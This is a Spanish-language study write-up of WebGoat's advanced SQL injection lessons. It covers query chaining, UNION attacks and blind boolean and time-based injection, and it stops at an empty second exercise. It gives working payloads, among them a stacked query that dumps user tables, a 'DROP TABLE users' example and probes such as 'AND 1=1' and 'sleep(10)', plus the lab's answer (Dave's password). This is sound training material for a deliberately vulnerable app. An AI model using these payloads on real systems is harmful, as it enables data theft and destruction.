# A1 Injection

La sección A1 de webgoat se refiere a las inyecciones SQL que son utilizadas para hacer que la aplicación se comporte de una manera no prevista por el desarrollador.

##### URL para ingresar a webgoat
+ http://localhost:8080/WebGoat/

# SQL Injection (Advanced)

## Preámbulo
Existen diversos carácteres especiales y sentencias que se pueden utilizar en SQL:

**Comentarios:**
```sql
/* */ 	 are inline comments
-- , # 	 are line comments

Example: SELECT * FROM users WHERE name = 'admin' --AND pass = 'pass'
```

**Encadenamiento de comandos:**
```sql
-- ;        allows query chaining

SELECT * FROM users; DROP TABLE users;
```

**Concatenación de cadenas**
```sql
-- ',+,||	 allows string concatenation
-- Char()	 strings without quotes

SELECT * FROM users WHERE name = '+char(27) OR 1=1
```

**Operador UNION**
Este operador se utiliza para combinar resultados de dos combinaciones SELECT. Se debe considerar lo siguiente:
+ El número de columnas en cada declaración debe ser el mismo
+ Los tipos de datos deben coincidir 
+ La sentencia `UNION ALL` permite resultados duplicados

```sql
SELECT first_name FROM user_system_data UNION SELECT login_count FROM user_data;
```

**Operador JOIN**
Combinar filas de dos o más tablas, en función de una columna relacionada.
```sql
SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;
```

## Ejercicio 1 (3)

#### Obten toda la información de las tablas


```sql
'SELECT * FROM user_data WHERE last_name = ''; SELECT * FROM user_system_data ;--'
```

#### Cuando lo obtengas responde cuál es el password de Dave
![Ejercicio 1](img2/ejercicio1.jpeg)
* El password es: `passW0rD`

## Blind SQL injection (Inyección SQL a ciegas u oculto)
Este es un tipo de inyección que hace preguntas de `verdadero` o `falso` y define el resultado en función de las respuestas del servidor. Este tipo de ataque se utiliza cuando el desarrollador no muestra los mensajes tipicos de error, pero no suprime la vulnerabilidad.
+ SQL basado en contenido
+ SQL basado en tiempo

**Ejemplos:**

Suponiendo que tienes un sitio con la url `https://my-shop.com?article=4 ` puedes deducir que por detŕas corre una sentencia del siguiente estilo

```sql
SELECT * FROM articles WHERE article_id = 4
```

Podemos explotar esta vulnerabilidad ingresando `https://shop.example.com?article=4 AND 1=1` que eventualmmente se interpretará como:

```sql
SELECT * FROM articles WHERE article_id = 4 and 1 = 1
```
+ Si esto nos sigue devolviendo la misma página que cuando se usaba `https://my-shop.com?article=4 ` significa que el sitio es propenso a inyección SQL a ciegas
+ Si nos regresa un `page not found` es probable que no sea vulnerable

Podemos aprovechar la sentencia anterior mediante `https://shop.example.com?article=4 AND substring(database_version(),1,1) = 2`. Una vez que sabemos que se puede explotar esto es solamente cuestión de creatividad y suerte de que la BD no esté correctamente configurada para localizar tablas de la BD sensibles. 

También podemos realizar una inyección basada en tiempo:
+ `article = 4; sleep(10) --`

## Ejercicio 2 (5)

Para este ejercicio encontramos un `login` por lo que podemos imaginar que la sentencia en SQL podría ser algo parecido a:


#### Haz login como Tom

